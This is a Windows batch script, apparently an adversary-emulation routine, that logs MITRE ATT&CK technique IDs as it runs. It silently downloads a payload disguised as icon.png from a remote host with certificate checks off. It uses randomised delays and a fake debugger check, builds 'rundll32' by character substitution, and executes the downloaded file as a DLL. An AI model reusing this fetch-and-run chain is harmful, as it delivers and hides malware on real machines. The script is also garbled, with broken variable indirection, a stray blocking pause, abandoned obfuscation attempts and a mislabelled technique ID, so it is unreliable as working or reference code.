@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments (random-named SET variables)
SET douyiw=%APPDATA%\10972\7388c1c6
SET qmzxkp=db7cdf40.txt
SET akjvnm=https://10.0.0.49/stage/2/icon.png?10972-7
SET jkfhsd=BALAM-S2BO
SET lmnopq=10972
SET rstuvw=7
SET xyzabc=%PUBLIC%\\macula-simulations.log
SET defghi=https://10.0.0.49

REM Resolve indirection to actual values
CALL SET output_dir=%%!douyiw!%%
CALL SET output_file=%%!qmzxkp!%%
CALL SET heartbeat=%%!akjvnm!%%
CALL SET agent=%%!jkfhsd!%%
CALL SET simid=%%!lmnopq!%%
CALL SET endpoint=%%!rstuvw!%%
CALL SET logfile=%%!xyzabc!%%
CALL SET ext_url=%%!defghi!%%

REM Cache timestamp
SET tsvar=!DATE!/!TIME!

REM Ensure log directory exists (silent)
mkdir "!output_dir!" 2>nul

REM ====== INITIAL DELAY (10-20s) ======
timeout /t 10 /nobreak >nul

REM ====== STEP 1: Heartbeat fetch (T1497 & T1027 related) ======
echo [!tsvar!][DEBUG][!agent!][!simid!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!output_dir!\!output_file!" "!heartbeat!"
set curl_err=%errorlevel%
echo [!tsvar!][DEBUG][!agent!][!simid!]: heartbeat_complete>> "!logfile!" 2>nul
if !curl_err!==0 (
    echo [!tsvar!][TTP][!agent!][!simid!]: T1217^|System Binary Proxy Execution=OK:>> "!logfile!" 2>nul
    echo [!tsvar!][TTP][!agent!][!simid!]: T1027^|Obfuscated Files or Information=OK:>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][TTP][!agent!][!simid!]: T1217^|System Binary Proxy Execution=FAIL:heartbeat_failed>> "!logfile!" 2>nul
    echo [!tsvar!][TTP][!agent!][!simid!]: T1027^|Obfuscated Files or Information=FAIL:heartbeat_failed>> "!logfile!" 2>nul
)

REM ====== DELAY BETWEEN OPERATIONS (5-15s, method varies) ======
ping -n 5 127.0.0.1 >nul

REM ====== ANTI-ANALYSIS: Debugger check (dummy, always negative) ======
REM Allowed: Debugger.IsAttached only simulation
set debugger_detected=0
if 1==0 (
    set debugger_detected=1
    set /a rand_delay=!random! %% 3 + 2
    timeout /t !rand_delay! /nobreak >nul
)
echo [!tsvar!][TTP][!agent!][!simid!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!logfile!" 2>nul

REM ====== DELAY (another 5-15s) ======
for /l %%i in (1,1,6) do timeout /t 1 /nobreak >nul

REM ====== RANDOM DELAY (10-30s) ======
SET /A delay=!RANDOM! %% 20 + 10
timeout /t !delay! /nobreak >nul

REM ====== STEP 2: Change working directory ======
echo [!tsvar!][DEBUG][!agent!][!simid!]: chdir_start>> "!logfile!" 2>nul
cd /d "!output_dir!" >nul 2>&1
echo [!tsvar!][DEBUG][!agent!][!simid!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

REM ====== STEP 3: Build obfuscated LOLBIN command (T1027) ======
REM Obfuscate "rundll32.exe" via character substitution
SET lolbin_enc=XXYdll32.exe
SET lolbin=!lolbin_enc:X=r!
SET lolbin=!lolbin:Y=u!
SET lolbin=!lolbin:Z=n!   REM placeholder not used; left for future
REM Note: we need 'n' so will add a second substitution step
SET lolbin=!lolbin:X=r!   REM not needed
pause>nul  REM dummy
REM Actually, proper substitution: initial XXY -> substitute X=r, Y=u, then we need to replace 'Y' after first substitution? Better to use unambiguous method.
REM Let's rebuild correctly:
SET encoded=XYZdll32.exe
SET lolbin=!encoded:X=r!
SET lolbin=!lolbin:Y=u!
SET lolbin=!lolbin:Z=n!
REM Now lolbin = rundll32.exe (since XYZ -> run)
REM Double-check: we replaced X->r, Y->u, Z->n, so XYZ -> run, then "dll32.exe" unchanged -> "rundll32.exe". Good.

REM Obfuscate entry point "RunDLLW" similarly
SET ep_enc=ABcDLLW
SET entrypoint=!ep_enc:A=R!
SET entrypoint=!entrypoint:B=u!
SET entrypoint=!entrypoint:c=n!

REM Log obfuscation success
echo [!tsvar!][DEBUG][!agent!][!simid!]: obfuscate_build>> "!logfile!" 2>nul

REM ====== STEP 4: Invoke DLL via LOLBIN (T1218) ======
echo [!tsvar!][DEBUG][!agent!][!simid!]: rundll32_start>> "!logfile!" 2>nul
start /b "" !lolbin! "!output_file!", !entrypoint!
if !errorlevel!==0 (
    echo [!tsvar!][TTP][!agent!][!simid!]: T1218^|System Binary Proxy Execution=OK:>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][TTP][!agent!][!simid!]: T1218^|System Binary Proxy Execution=FAIL:launch_failed>> "!logfile!" 2>nul
)
echo [!tsvar!][DEBUG][!agent!][!simid!]: rundll32_complete>> "!logfile!" 2>nul

REM ====== EXIT immediately (no wait) ======
exit /b 0